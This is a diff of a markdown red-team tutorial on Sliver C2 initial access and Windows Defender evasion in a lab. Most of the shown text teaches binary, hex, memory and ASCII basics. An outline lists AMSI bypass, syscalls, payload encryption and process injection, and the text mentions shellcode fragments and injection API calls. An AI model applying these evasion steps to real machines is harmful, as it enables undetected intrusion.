@@ -1,4077 +1,3671 @@
-# Initial Access with Sliver C2 - THE COMPLETE GUIDE
-## From Zero Knowledge to Building Evasive Payloads
+# INITIAL ACCESS WITH SLIVER C2
+## Complete Guide - From Basics to Bypassing Windows Defender
+
+---
+
+# ABOUT THIS GUIDE
+
+This guide teaches you how to run a Sliver implant on a Windows machine without Windows Defender catching it.
+
+Before we do that, we need to learn how computers work. If you do not understand computers, you cannot understand hacking.
+
+So we start from very basics. We go step by step. By the end, you will be able to:
+- Understand what is happening inside the computer
+- Write your own loader
+- Bypass Defender
+- Get shell on target machine
+
+---
+
+# YOUR LAB SETUP
+
+| Computer | IP Address | What it is |
+|----------|------------|------------|
+| DC01 | 192.168.100.10 | Domain Controller (Windows Server) |
+| WS01 | 192.168.100.20 | Target Computer (Windows 11 with Defender) |
+| WS02 | 192.168.100.30 | Second Workstation (Windows 11) |
+| Kali | 192.168.100.100| Your Attack Machine (Sliver is here) |
+
+**Our Target:** WS01 (Windows 11 with Defender turned ON)
 
 ---
 
 # TABLE OF CONTENTS
 
-**FOUNDATION CONCEPTS**
-1. [Computer Architecture Basics](#part-1-computer-architecture)
-2. [What is Windows Defender](#part-2-windows-defender)
-3. [What are Windows APIs](#part-3-windows-apis)
-4. [Memory Management](#part-4-memory-management)
-5. [Processes and Threads](#part-5-processes-threads)
+## PART 1: HOW COMPUTERS STORE INFORMATION
+- Chapter 1: What is Binary
+- Chapter 2: What is a Byte
+- Chapter 3: What is Hexadecimal
+- Chapter 4: How Numbers are Stored
+- Chapter 5: How Text is Stored
+- Chapter 6: What is the Difference Between Data and Code
 
-**SECURITY CONCEPTS**
-6. [How Malware Gets Detected](#part-6-detection)
-7. [What is AMSI](#part-7-amsi)
-8. [What is ETW](#part-8-etw)
-9. [What is Shellcode](#part-9-shellcode)
+## PART 2: HOW PROGRAMS RUN
+- Chapter 7: What Does the CPU Do
+- Chapter 8: What is Memory
+- Chapter 9: What is the Stack
+- Chapter 10: User Mode and Kernel Mode
 
-**PRACTICAL ATTACK**
-10. [What is C2](#part-10-c2)
-11. [Setting Up Sliver](#part-11-sliver)
-12. [Building the Loader](#part-12-loader)
-13. [Executing the Attack](#part-13-attack)
-14. [Post-Exploitation Commands](#part-14-postexploit)
-15. [Troubleshooting Common Issues](#part-15-troubleshoot)
-16. [MITRE ATT&CK Mapping](#part-16-mitre)
-17. [Persistence with Defender Bypass](#part-17-persistence)
-18. [Interview Questions](#part-18-interview)
-19. [Cleanup and Next Steps](#part-19-cleanup)
+## PART 3: LEARNING C PROGRAMMING
+- Chapter 11: Setting Up C on Windows
+- Chapter 12: What is a Variable
+- Chapter 13: What is a Pointer
+- Chapter 14: What is a Function
+- Chapter 15: Arrays and Strings
+- Chapter 16: What is Buffer Overflow
+
+## PART 4: HOW SOURCE CODE BECOMES A PROGRAM
+- Chapter 17: What is Compilation
+- Chapter 18: What is Assembly Language
+- Chapter 19: What is PE File Format
+- Chapter 20: How Windows Loads a Program
+
+## PART 5: WINDOWS INTERNALS
+- Chapter 21: What is a Process
+- Chapter 22: What is a Thread
+- Chapter 23: What is Virtual Memory
+- Chapter 24: What is Windows API
+- Chapter 25: What is a DLL
+
+## PART 6: SHELLCODE
+- Chapter 26: What is Shellcode
+- Chapter 27: How to Write Shellcode
+- Chapter 28: What is a Shellcode Loader
+- Chapter 29: What is Process Injection
+
+## PART 7: COMMAND AND CONTROL
+- Chapter 30: What is C2
+- Chapter 31: How Sliver Works
+- Chapter 32: Setting Up Sliver
+- Chapter 33: Creating Your Payload
+
+## PART 8: HOW DETECTION WORKS
+- Chapter 34: How Defender Catches Malware
+- Chapter 35: What is AMSI
+- Chapter 36: What is ETW
+
+## PART 9: BYPASSING DETECTION
+- Chapter 37: How to Bypass AMSI
+- Chapter 38: How to Use Direct Syscalls
+- Chapter 39: How to Encrypt Your Payload
+- Chapter 40: Other Evasion Methods
+
+## PART 10: RUNNING THE ATTACK
+- Chapter 41: Building Final Payload
+- Chapter 42: Running on Target
+- Chapter 43: Fixing Problems
+
+## PART 11: EXTRA MATERIAL
+- Chapter 44: Interview Questions
+- Chapter 45: Important Commands
+- Chapter 46: Common Errors and Solutions
 
 ---
 
-# PART 1: Computer Architecture Basics {#part-1-computer-architecture}
-
-Before we build malware that bypasses security, we need to understand how computers actually work. This section teaches you through hands-on exercises - you will run commands, see output, and understand what's happening at each step.
-
-**Why is this important for hacking?**
-
-See, many people just copy-paste code from GitHub and run exploits. But when something breaks, they are stuck. When you understand the fundamentals - CPU, RAM, how programs actually run - you can:
-
-1. Debug your own malware when it crashes
-2. Understand why certain bypass techniques work
-3. Develop new techniques that no antivirus has seen
-4. Answer interview questions confidently
-5. Think like a real attacker, not just a script kiddie
-
-So let's start from the very basics. No assumptions. Even if you know some of this, read it properly - I will connect every concept to actual attacks.
+# PART 1: HOW COMPUTERS STORE INFORMATION
 
 ---
 
-## 1.1: The CPU - What Actually Executes Your Code
+# CHAPTER 1: What is Binary
 
-### What is the CPU?
+## Introduction
 
-The **CPU (Central Processing Unit)** is a chip that reads instructions and executes them. Every program, every click, every action on your computer ultimately becomes instructions that the CPU processes one by one.
+Before we can understand hacking, we need to understand how computers store data.
 
-**Let me explain this more clearly:**
+Computers cannot understand words or numbers like we do. Computers only understand two things:
+- OFF
+- ON
 
-Your computer has many components - hard disk, RAM, keyboard, monitor, etc. But only ONE component actually "does work" - that is the CPU. Everything else is just storage or input/output.
+We call OFF as **0**
+We call ON as **1**
 
-When you double-click on Chrome, what happens?
+This is called **binary**. Everything in a computer is stored using only 0 and 1.
 
-1. Windows reads Chrome.exe from your hard disk
-2. Windows copies the code into RAM (memory)
-3. Windows tells the CPU: "Start executing from this memory address"
-4. CPU starts reading instructions and doing them
+## How We Count Normally
 
-The CPU is doing ALL the work. It is adding numbers, comparing values, moving data, jumping to different parts of code - everything.
-
-**Why does this matter for hacking?**
-
-When we inject shellcode, we are basically giving the CPU NEW instructions to execute. The CPU doesn't know the difference between "legitimate code from Microsoft" and "malicious code from a hacker." It just reads bytes and does what they say.
-
-This is the fundamental reason why code injection attacks work. The CPU is a dumb machine - very fast, but dumb. It will execute whatever you give it.
-
-### How the CPU Works - The Fetch-Decode-Execute Cycle
-
-The CPU runs an endless cycle, billions of times per second:
+In normal life, we count like this:
 
 ```
-1. FETCH   - Read the next instruction from RAM
-2. DECODE  - Figure out what the instruction means  
-3. EXECUTE - Do the operation (add, compare, jump, etc.)
-4. REPEAT  - Go to the next instruction
+0, 1, 2, 3, 4, 5, 6, 7, 8, 9
 ```
 
-**Let me explain each step in detail:**
-
-**Step 1 - FETCH:**
-The CPU has a special register called the "Instruction Pointer" (IP) or "Program Counter" (PC). This register holds the memory address of the NEXT instruction to execute.
-
-So if IP = 0x00401000, the CPU reads the bytes at memory address 0x00401000.
-
-**Step 2 - DECODE:**
-The CPU looks at the bytes it fetched and figures out: "Okay, this byte sequence means ADD these two registers" or "This means JUMP to a different address."
-
-**Step 3 - EXECUTE:**
-The CPU actually does the operation. If it's ADD, it adds. If it's JUMP, it changes the IP to point to the new location.
-
-**Step 4 - REPEAT:**
-The IP is incremented (or changed if there was a JUMP), and the cycle continues.
-
-Modern CPUs do this **billions of times per second**. A 3 GHz CPU does about 3 billion cycles per second. This is why computers are so fast.
-
-**Attack relevance:**
-
-When we inject shellcode, we are manipulating this cycle. We:
-1. Put our malicious bytes into memory (using VirtualAlloc)
-2. Change the IP to point to our malicious bytes (using CreateThread)
-3. CPU starts executing OUR code instead of legitimate code
-
-### What is an Instruction? (In Simple Terms)
-
-An instruction is the smallest operation a CPU can perform. Think of it as a single command.
-
-Here are real x86-64 instructions that you will see in shellcode:
-
-| Instruction | What it does | Why it matters |
-|-------------|--------------|----------------|
-| `ADD RAX, RBX` | Add the value in register RBX to register RAX | Math operations |
-| `MOV RCX, 5` | Put the number 5 into register RCX | Moving data around |
-| `CMP RAX, 0` | Compare RAX to zero (sets flags for next instruction) | Checking conditions |
-| `JNZ label` | Jump to 'label' if the last comparison was not zero | Changing program flow |
-| `CALL function` | Call a function (save return address, jump there) | Running API functions |
-| `RET` | Return from function (go back to saved address) | Finishing a function |
-| `PUSH RAX` | Save RAX value onto the stack | Saving data temporarily |
-| `POP RAX` | Restore RAX value from the stack | Getting saved data back |
-| `XOR RAX, RAX` | XOR RAX with itself (makes it zero) | Clearing a register |
-| `NOP` | Do nothing (No Operation) | Padding, NOPsleds |
-
-A program is just a LONG sequence of these simple instructions. Even complex software like Chrome or Microsoft Word is ultimately just millions of these basic instructions.
-
-**Shellcode is also just a sequence of these instructions!**
-
-When security researchers look at shellcode, they don't see "hacker magic." They see normal CPU instructions arranged in a specific way to do malicious things (like connecting back to your C2 server).
-
-### What is Machine Code? (The CPU's Language)
-
-The CPU only understands numbers. It cannot read English or any programming language. Each instruction is encoded as bytes (numbers in hexadecimal).
-
-**Example - Let's see real machine code:**
+When we reach 9, we have no more single digits. So we add one more place:
 
 ```
-Machine Code (hex)     Assembly (human-readable)
---------------------------------------------------
-55                     push rbp
-48 89 E5               mov rbp, rsp
-B8 05 00 00 00         mov eax, 5
-5D                     pop rbp
-C3                     ret
+10, 11, 12, 13... and so on
 ```
 
-**Breaking this down:**
+We use 10 digits (0 to 9). This is called **decimal** system.
 
-- `55` is one byte - when the CPU sees this byte, it knows "push rbp"
-- `48 89 E5` is three bytes - this means "mov rbp, rsp"
-- `B8 05 00 00 00` is five bytes - "mov eax, 5" (the 05 00 00 00 is the number 5 in little-endian format)
-- `5D` is one byte - "pop rbp"
-- `C3` is one byte - "return from function"
+## How Computers Count
 
-**The key insight:** Assembly language (push, mov, add, etc.) is just a human-readable version of machine code. When you "compile" assembly, you get these raw bytes. When you "disassemble" a program, you convert bytes back to assembly.
-
-**Shellcode is literally these raw bytes!**
-
-When Sliver generates shellcode, it gives you bytes like:
-```
-\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50...
-```
-
-Each `\x` is one byte in hex. `\xfc` means byte value 252 in decimal, or FC in hexadecimal. This is an actual CPU instruction!
-
-### HANDS-ON EXERCISE 1: See Machine Code From Your Own C Program
-
-This exercise will show you exactly how your code becomes machine code. You will see the connection between your C program and the raw bytes the CPU executes.
-
-**On Linux (Kali):**
-
-**Step 1 - Create a simple C program:**
-
-```bash
-# Open nano text editor
-nano add.c
-```
-
-Type this code (I will explain every line):
-
-```c
-#include <stdio.h>   // Include library for printf function
-
-int main() {         // Entry point of the program
-    int a = 5;       // Create variable 'a', store value 5
-    int b = 10;      // Create variable 'b', store value 10
-    int result = a + b;  // Add them, store in 'result'
-    printf("Result: %d\n", result);  // Print the result
-    return 0;        // Exit with success code
-}
-```
-
-Save and exit: Press Ctrl+O (to save), then Enter (to confirm), then Ctrl+X (to exit).
-
-**Step 2 - Compile the program:**
-
-```bash
-gcc add.c -o add
-```
-
-**What just happened here?**
-
-gcc is the GNU C Compiler. It does several things:
-
-1. **Preprocessing** - Handles the `#include` directives
-2. **Compilation** - Converts C code to assembly language
-3. **Assembly** - Converts assembly to machine code (object file)
-4. **Linking** - Combines all object files and libraries into final executable
-
-The output file `add` now contains machine code that the CPU can execute directly.
-
-**Step 3 - Run your program:**
-
-```bash
-./add
-```
-
-Output:
-```
-Result: 15
-```
-
-Your CPU just executed the machine code! The bytes that gcc created were read by the CPU and executed.
-
-**Step 4 - See the actual machine code:**
-
-```bash
-objdump -d add | grep -A 20 "<main>:"
-```
-
-**What is objdump?**
-objdump is a tool that "disassembles" a binary file. It reads the raw bytes and converts them back to assembly language so humans can understand.
-
-**Output (your addresses will differ):**
+Computers only have 0 and 1. So they count differently.
 
 ```
-0000000000001149 <main>:
-    1149:   f3 0f 1e fa             endbr64 
-    114d:   55                      push   %rbp
-    114e:   48 89 e5                mov    %rsp,%rbp
-    1151:   48 83 ec 10             sub    $0x10,%rsp
-    1155:   c7 45 f4 05 00 00 00    movl   $0x5,-0xc(%rbp)
-    115c:   c7 45 f8 0a 00 00 00    movl   $0xa,-0x8(%rbp)
-    1163:   8b 55 f4                mov    -0xc(%rbp),%edx
-    1166:   8b 45 f8                mov    -0x8(%rbp),%eax
-    1169:   01 d0                   add    %edx,%eax
-    116b:   89 45 fc                mov    %eax,-0x4(%rbp)
+0 = 0
+1 = 1
 ```
 
-**Understanding the output format:**
+Now what comes after 1? We have no more digits! So we add one more place:
 
 ```
-ADDRESS:  MACHINE_CODE_BYTES       ASSEMBLY_INSTRUCTION
-1155:     c7 45 f4 05 00 00 00    movl   $0x5,-0xc(%rbp)
+10 = 2 (in decimal)
+11 = 3 (in decimal)
 ```
 
-- `1155` = Memory address where this instruction lives
-- `c7 45 f4 05 00 00 00` = The actual bytes (machine code)
-- `movl $0x5,-0xc(%rbp)` = Assembly language (human readable)
+Again no more options. Add one more place:
 
-**Let's break this down line by line:**
+```
+100 = 4 (in decimal)
+101 = 5 (in decimal)
+110 = 6 (in decimal)
+111 = 7 (in decimal)
+1000 = 8 (in decimal)
+```
 
-| Address | Machine Code | Assembly | Your C Code |
-|---------|--------------|----------|-------------|
-| 1155 | `c7 45 f4 05 00 00 00` | `movl $0x5,-0xc(%rbp)` | `int a = 5;` |
-| 115c | `c7 45 f8 0a 00 00 00` | `movl $0xa,-0x8(%rbp)` | `int b = 10;` |
-| 1163 | `8b 55 f4` | `mov -0xc(%rbp),%edx` | Load 'a' into register |
-| 1166 | `8b 45 f8` | `mov -0x8(%rbp),%eax` | Load 'b' into register |
-| 1169 | `01 d0` | `add %edx,%eax` | `a + b` |
-| 116b | `89 45 fc` | `mov %eax,-0x4(%rbp)` | Store result |
+And so on.
 
-**The critical understanding:**
+## How to Read a Binary Number
 
-The CPU doesn't see your C code. It doesn't know what "int" means. It doesn't understand variable names like "a" or "b".
+Let me teach you a simple method.
 
-The CPU only sees: `c7 45 f4 05 00 00 00`
+Each position in binary has a value. Starting from the right:
+- First position = 1
+- Second position = 2
+- Third position = 4
+- Fourth position = 8
+- Fifth position = 16
+- Sixth position = 32
+- Seventh position = 64
+- Eighth position = 128
 
-And it executes: "Put the value 5 at this memory location."
+**See the pattern? Each position is double the previous one.**
 
-**This is the exact same thing that happens with shellcode!**
+## Example 1: What is 1011 in decimal?
 
-When we inject shellcode, the CPU sees bytes like `\xfc\x48\x83\xe4\xf0` and executes them. The CPU doesn't know if these bytes came from:
-- A legitimate program compiled by a developer
-- Microsoft
-- A hacker's shellcode
+Let us write the positions:
 
-It just reads the bytes and does what they say. **This is WHY code injection works.**
+```
+Position Values:    8    4    2    1
+Binary Number:      1    0    1    1
+```
 
-### Why This Matters for Red Team Operations
+Now add the values where binary has 1:
+- 8 (yes, binary has 1)
+- 4 (no, binary has 0)
+- 2 (yes, binary has 1)
+- 1 (yes, binary has 1)
 
-Now you understand the fundamental truth: **The CPU executes whatever bytes you give it.**
+Answer = 8 + 2 + 1 = **11**
 
-When we do process injection:
+So binary 1011 = decimal 11.
 
-1. We allocate memory in a target process (VirtualAllocEx)
-2. We copy our shellcode bytes into that memory (WriteProcessMemory)
-3. We tell the CPU to start executing at that address (CreateRemoteThread)
+## Example 2: What is 11001 in decimal?
 
-The CPU happily executes our malicious bytes because it doesn't know they are malicious. It just sees bytes and follows instructions.
+```
+Position Values:   16    8    4    2    1
+Binary Number:      1    1    0    0    1
+```
 
-**Security implications:**
+Add where binary has 1:
+- 16 (yes)
+- 8 (yes)
+- 4 (no)
+- 2 (no)
+- 1 (yes)
 
-This is why modern security tools focus on:
-- Detecting suspicious memory allocations
-- Monitoring for executable memory regions
-- Watching for CreateRemoteThread calls
-- Looking for injected code in processes
+Answer = 16 + 8 + 1 = **25**
 
-And our job as attackers is to do these things in ways that avoid detection.
+So binary 11001 = decimal 25.
+
+## Example 3: How to Convert Decimal 50 to Binary
+
+Now the opposite direction. We have 50 and want binary.
+
+**Step 1:** Write position values that fit in 50
+
+```
+32    16    8    4    2    1
+```
+
+(64 is bigger than 50, so we stop at 32)
+
+**Step 2:** Check which values fit
+
+- Does 32 fit in 50? Yes. 50 - 32 = 18 left. Write 1.
+- Does 16 fit in 18? Yes. 18 - 16 = 2 left. Write 1.
+- Does 8 fit in 2? No. Write 0.
+- Does 4 fit in 2? No. Write 0.
+- Does 2 fit in 2? Yes. 2 - 2 = 0 left. Write 1.
+- Does 1 fit in 0? No. Write 0.
+
+**Step 3:** Read the binary number
+
+```
+32    16    8    4    2    1
+ 1     1    0    0    1    0
+```
+
+Answer: **110010**
+
+Let us verify: 32 + 16 + 2 = 50 ✓
+
+## Why is This Important?
+
+Everything in a computer is binary:
+- The letter 'A' is stored as binary
+- The number 1000 is stored as binary
+- Your password is stored as binary
+- Shellcode is binary
+
+When we encrypt or hide our payload, we are changing the binary. So you must understand it.
+
+## Practice Problems
+
+Try these yourself:
+
+**Convert binary to decimal:**
+1. 1010 = ?
+2. 11111 = ?
+3. 100000 = ?
+
+**Convert decimal to binary:**
+1. 20 = ?
+2. 100 = ?
+3. 255 = ?
+
+## Answers
+
+**Binary to decimal:**
+1. 1010 = 8 + 2 = 10
+2. 11111 = 16 + 8 + 4 + 2 + 1 = 31
+3. 100000 = 32
+
+**Decimal to binary:**
+1. 20 = 10100 (16 + 4)
+2. 100 = 1100100 (64 + 32 + 4)
+3. 255 = 11111111 (128 + 64 + 32 + 16 + 8 + 4 + 2 + 1)
 
 ---
 
-## 1.2: RAM - Where Running Code Lives
+# CHAPTER 2: What is a Byte
 
-### What is RAM?
+## Introduction
 
-**RAM (Random Access Memory)** is temporary storage where all running programs exist. When you run `./add`, the operating system:
+One binary digit (0 or 1) is called a **bit**.
 
-1. Reads the file from disk
-2. Copies the code into RAM
-3. Points the CPU at that RAM location
-4. CPU starts executing
+One bit can only store 2 values - either 0 or 1. That is not very useful.
 
-**Why is RAM needed? Why not run directly from disk?**
+So we group 8 bits together. This group of 8 bits is called a **byte**.
 
-Good question. Hard disks are SLOW. A hard disk can read maybe 100-500 megabytes per second. But the CPU can process billions of instructions per second. If the CPU had to read every instruction from disk, it would spend 99.99% of its time waiting.
+## How Many Values Can a Byte Store?
 
-RAM is FAST. It can feed data to the CPU at the speed the CPU needs. So we copy programs from disk to RAM, and then execute from RAM.
+With 1 bit: 2 values (0 or 1)
+With 2 bits: 4 values (00, 01, 10, 11)
+With 3 bits: 8 values
+With 4 bits: 16 values
+With 5 bits: 32 values
+With 6 bits: 64 values
+With 7 bits: 128 values
+With 8 bits: 256 values
 
-**For attackers, this creates an opportunity:**
+**A byte can store 256 different values: from 0 to 255.**
 
-If we can put our code directly into RAM without writing to disk, antivirus cannot scan the file because there IS no file on disk. This is called "fileless malware" or "in-memory execution."
+## Example: The Byte Value 65
 
-### RAM vs Disk - The Critical Difference for Evasion
+Let us see what 65 looks like in binary (as a byte).
 
-| Property | Hard Disk | RAM |
-|----------|-----------|-----|
-| Speed | Slow (100-500 MB/s) | Fast (25-50 GB/s) |
-| Persistence | Data survives reboot | Data lost on reboot |
-| Antivirus scanning | YES - AV scans files on disk | LIMITED - Harder to scan |
-| Forensics | Files can be recovered | Volatile, harder to analyze |
-| Our goal | AVOID writing here | Execute our code HERE |
-
-**This is why we build in-memory loaders:**
-
-Our loader will:
-1. Receive encrypted shellcode (so it looks random/harmless)
-2. Decrypt it in memory (RAM)
-3. Execute it from memory (RAM)
-4. Never write the decrypted shellcode to disk
-
-Antivirus primarily scans files on disk. If we never create a malicious file on disk, we bypass a HUGE portion of antivirus detection.
-
-### Key Properties of RAM
-
-| Property | What it means | Why it matters |
-|----------|---------------|----------------|
-| **Volatile** | Cleared when power is off | Forensics: RAM evidence disappears on shutdown |
-| **Fast** | ~100 nanoseconds access | CPU can read billions of bytes per second |
-| **Byte-addressable** | Each byte has a unique address | We can read/write specific locations |
-
-### How RAM is Organized
-
-RAM is a giant array of bytes. Each byte has an address (a number).
-
+First, position values for 8 bits:
 ```
-Address (hex)    Contents
---------------------------------------------------
-0x00000000       [byte 0]
-0x00000001       [byte 1]
-0x00000002       [byte 2]
-...
-0x7FFFFFFF       [byte ~2 billion - end of user space]
+128    64    32    16    8    4    2    1
 ```
 
-With 16 GB of RAM, you have about 17 billion addressable bytes.
+65 = 64 + 1
 
-### HANDS-ON EXERCISE 2: See What's in a Process's Memory (Linux)
-
-Step 1 - Create a program that stays running:
-
-```bash
-nano loop.c
+So:
 ```
+128    64    32    16    8    4    2    1
+  0     1     0     0    0    0    0    1
+```
+
+The byte is: **01000001**
+
+## Why 65 is Important
+
+In computers, each letter is stored as a number. There is a standard list called **ASCII**.
+
+In ASCII:
+- 'A' = 65
+- 'B' = 66
+- 'C' = 67
+- ... and so on
+
+So when you type 'A' on keyboard, the computer stores 65 (which is 01000001 in binary).
+
+## Some Important Byte Values
+
+| Value | What It Means |
+|-------|---------------|
+| 0 | Often means "end" or "nothing" |
+| 32 | Space character |
+| 48 to 57 | Digits '0' to '9' |
+| 65 to 90 | Capital letters 'A' to 'Z' |
+| 97 to 122 | Small letters 'a' to 'z' |
+| 255 | Maximum byte value |
+
+## Bigger Numbers Need More Bytes
+
+One byte can only store 0 to 255.
+
+For bigger numbers, we use more bytes:
+
+| Name | How Many Bytes | Can Store |
+|------|----------------|-----------|
+| Byte | 1 | 0 to 255 |
+| Word | 2 | 0 to 65,535 |
+| DWORD | 4 | 0 to about 4 billion |
+| QWORD | 8 | 0 to very very big number |
+
+When we program in C or call Windows API, we will see DWORD and QWORD many times.
+
+---
+
+# CHAPTER 3: What is Hexadecimal
+
+## The Problem
+
+Binary is hard to read. Look at this:
+
+```
+01001000 01100101 01101100 01101100 01101111
+```
+
+That is 5 bytes. Very hard to read.
+
+Decimal (normal numbers) is easier: 72, 101, 108, 108, 111
+
+But decimal is also not perfect. Sometimes one byte is 2 digits (72), sometimes 3 digits (255). Hard to line up.
+
+## The Solution: Hexadecimal
+
+Hexadecimal uses 16 digits instead of 10.
+
+The 16 digits are: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E, F
+
+| Decimal | Hexadecimal |
+|---------|-------------|
+| 0 | 0 |
+| 1 | 1 |
+| 2 | 2 |
+| ... | ... |
+| 9 | 9 |
+| 10 | A |
+| 11 | B |
+| 12 | C |
+| 13 | D |
+| 14 | E |
+| 15 | F |
+
+## Why Hexadecimal is Perfect for Bytes
+
+One hex digit can show values 0 to 15.
+In binary, that is 4 bits (0000 to 1111).
+
+One byte is 8 bits.
+So one byte is exactly 2 hex digits.
+
+This is very clean:
+
+| Decimal | Binary | Hexadecimal |
+|---------|--------|-------------|
+| 0 | 00000000 | 00 |
+| 15 | 00001111 | 0F |
+| 65 | 01000001 | 41 |
+| 255 | 11111111 | FF |
+
+Every byte is exactly 2 hex characters. Very easy to read.
+
+## How to Read Hexadecimal
+
+Hexadecimal is written with "0x" in front. So 0x41 means hexadecimal 41.
+
+To convert 0x41 to decimal:
+- First digit: 4
+- Second digit: 1
+- Value = (4 × 16) + (1 × 1) = 64 + 1 = 65
+
+To convert 0xFF to decimal:
+- First digit: F = 15
+- Second digit: F = 15
+- Value = (15 × 16) + (15 × 1) = 240 + 15 = 255
+
+## Example: "Hello" in Hexadecimal
+
+Each letter has a number (ASCII):
+- H = 72 = 0x48
+- e = 101 = 0x65
+- l = 108 = 0x6C
+- l = 108 = 0x6C
+- o = 111 = 0x6F
+
+So "Hello" in hex is: **48 65 6C 6C 6F**
+
+This is what you see in hex editors and debuggers. Now you know how to read it.
+
+## Where You Will See Hex
+
+**Shellcode:**
+```
+\x48\x89\x5c\x24\x08
+```
+Each \x followed by 2 characters is one byte in hex.
+
+**Memory addresses:**
+```
+0x00007FFE12340000
+```
+
+**In debuggers and tools:**
+```
+Address   Bytes                    Text
+00000000  48 65 6C 6C 6F 00       Hello.
+```
+
+## Practice
+
+**Convert hex to decimal:**
+- 0x10 = ?
+- 0x20 = ?
+- 0x7F = ?
+
+**Convert decimal to hex:**
+- 16 = ?
+- 100 = ?
+- 200 = ?
+
+## Answers
+
+**Hex to decimal:**
+- 0x10 = (1 × 16) + 0 = 16
+- 0x20 = (2 × 16) + 0 = 32
+- 0x7F = (7 × 16) + 15 = 112 + 15 = 127
+
+**Decimal to hex:**
+- 16 = 0x10
+- 100 = 0x64 (100 ÷ 16 = 6 remainder 4)
+- 200 = 0xC8 (200 ÷ 16 = 12 remainder 8, 12 = C)
+
+---
+
+---
+
+# CHAPTER 4: How Numbers are Stored in Memory
+
+## Introduction
+
+Now we know what bytes are. But where do bytes live?
+
+They live in **memory** (also called RAM).
+
+Think of memory like a very long line of boxes. Each box can hold one byte. Each box has a number called its **address**.
+
+```
+Address:  0    1    2    3    4    5    6    7    ...
+         [  ] [  ] [  ] [  ] [  ] [  ] [  ] [  ] ...
+```
+
+When we store something, we put bytes in these boxes.
+
+## Storing a Small Number (0 to 255)
+
+If the number is between 0 and 255, it fits in one byte.
+
+**Example: Storing the number 42**
+
+42 in binary is 00101010.
+
+We put this in one box:
+
+```
+Address:  1000
+         [00101010]  = 42
+```
+
+Simple!
+
+## Storing a Bigger Number
+
+But what if the number is bigger than 255?
+
+**Example: Storing the number 1000**
+
+1000 is bigger than 255, so it does not fit in one byte.
+
+We need 2 bytes.
+
+First, let us convert 1000 to binary:
+
+1000 = 512 + 256 + 128 + 64 + 32 + 8 = ?
+
+Wait, let me do it properly:
+- 1000 ÷ 2 = 500, remainder 0
+- 500 ÷ 2 = 250, remainder 0
+- 250 ÷ 2 = 125, remainder 0
+- 125 ÷ 2 = 62, remainder 1
+- 62 ÷ 2 = 31, remainder 0
+- 31 ÷ 2 = 15, remainder 1
+- 15 ÷ 2 = 7, remainder 1
+- 7 ÷ 2 = 3, remainder 1
+- 3 ÷ 2 = 1, remainder 1
+- 1 ÷ 2 = 0, remainder 1
+
+Reading from bottom to top: 1111101000
+
+That is 10 bits. We need at least 2 bytes (16 bits).
+
+With padding: 0000001111101000
+
+Split into 2 bytes:
+- Byte 1: 00000011 = 0x03
+- Byte 2: 11101000 = 0xE8
+
+So 1000 in hex is 0x03E8.
+
+## Little Endian: The Backward Order
+
+Now, which byte do we store first?
+
+On Intel/AMD computers (which is what we use), we store the **smaller part first**. This is called **little endian**.
+
+So for 1000 (0x03E8):
+- First box: E8 (the smaller/right part)
+- Second box: 03 (the bigger/left part)
+
+```
+Address:  1000   1001
+         [0xE8] [0x03]
+```
+
+This looks backward, but that is how Intel works.
+
+## Why Little Endian Matters for Hacking
+
+When you write an exploit and you want to put an address like 0x00401000 in memory, you must write it backward:
+
+```
+Address bytes: 00 40 10 00
+
+In memory: 00 10 40 00  (reversed)
+```
+
+If you forget this, your exploit will not work.
+
+## Common Number Sizes
+
+| Name | Bytes | Range | Example Use |
+|------|-------|-------|-------------|
+| BYTE | 1 | 0-255 | Characters, small flags |
+| WORD | 2 | 0-65535 | Port numbers |
+| DWORD | 4 | 0 to 4 billion | Many Windows API values |
+| QWORD | 8 | Very big | Memory addresses (64-bit) |
+
+---
+
+# CHAPTER 5: How Text is Stored in Memory
+
+## Introduction
+
+Now we know how numbers are stored. What about text?
+
+The answer is simple: **text is also just numbers**.
+
+Each letter has a number. This is called **ASCII** (American Standard Code for Information Interchange).
+
+## The ASCII Table (Important Parts)
+
+| Character | Decimal | Hex |
+|-----------|---------|-----|
+| (space) | 32 | 0x20 |
+| 0 | 48 | 0x30 |
+| 1 | 49 | 0x31 |
+| 9 | 57 | 0x39 |
+| A | 65 | 0x41 |
+| B | 66 | 0x42 |
+| Z | 90 | 0x5A |
+| a | 97 | 0x61 |
+| b | 98 | 0x62 |
+| z | 122 | 0x7A |
+
+**Notice:** Capital 'A' is 65. Small 'a' is 97. The difference is 32.
+
+To change 'A' to 'a': add 32.
+To change 'a' to 'A': subtract 32.
+
+## Example: Storing "Hi" in Memory
+
+The word "Hi":
+- H = 72 = 0x48
+- i = 105 = 0x69
+
+In memory:
+
+```
+Address:  1000   1001
+         [0x48] [0x69]
+           H      i
+```
+
+## The Null Terminator
+
+How does the computer know where a text ends?
+
+Answer: We put a special byte at the end. This byte is **0** (zero). It is called the **null terminator** or **null byte**.
+
+**Example: Storing "Hi" as a proper string**
+
+```
+Address:  1000   1001   1002
+         [0x48] [0x69] [0x00]
+           H      i    END
+```
+
+The 0x00 at the end tells the computer: "The string ends here."
+
+## Why Null Terminator is Important for Hacking
+
+Many programs read strings until they see 0x00.
+
+If you can remove or overwrite the 0x00, the program will keep reading into other memory. This can cause:
+- Information leak (reading data you should not see)
+- Crash (reading invalid memory)
+- Exploit opportunity
+
+Also, if your shellcode contains 0x00 bytes, it might get cut off early. That is why we often need **null-free shellcode**.
+
+## Example: Storing "Hello" in Memory
+
+Let us trace exactly where each byte goes.
+
+"Hello" in ASCII:
+- H = 0x48
+- e = 0x65
+- l = 0x6C
+- l = 0x6C
+- o = 0x6F
+- (null) = 0x00
+
+```
+Address:  1000   1001   1002   1003   1004   1005
+         [0x48] [0x65] [0x6C] [0x6C] [0x6F] [0x00]
+           H      e      l      l      o    END
+```
+
+Total: 6 bytes (5 for letters + 1 for null).
+
+---
+
+# CHAPTER 6: The Difference Between Data and Code
+
+## Introduction
+
+This is a very important chapter. Pay attention.
+
+We have learned that computers store everything as bytes. Letters are bytes. Numbers are bytes.
+
+But **code** (instructions for the computer) is also bytes.
+
+So how does the computer know if bytes are data or code?
+
+## The Answer: Context
+
+The bytes themselves do not say "I am data" or "I am code".
+
+The **location** and **how they are used** decides this.
+
+Let me explain with an example.
+
+## Example: The Byte 0x48
+
+The byte 0x48 can mean different things:
+
+**As text:** 0x48 = 72 = letter 'H'
+
+**As code (on x64):** 0x48 is the "REX.W" prefix. It tells the CPU "the next instruction uses 64-bit size".
+
+Same byte. Different meaning.
+
+## How Does the Computer Decide?
+
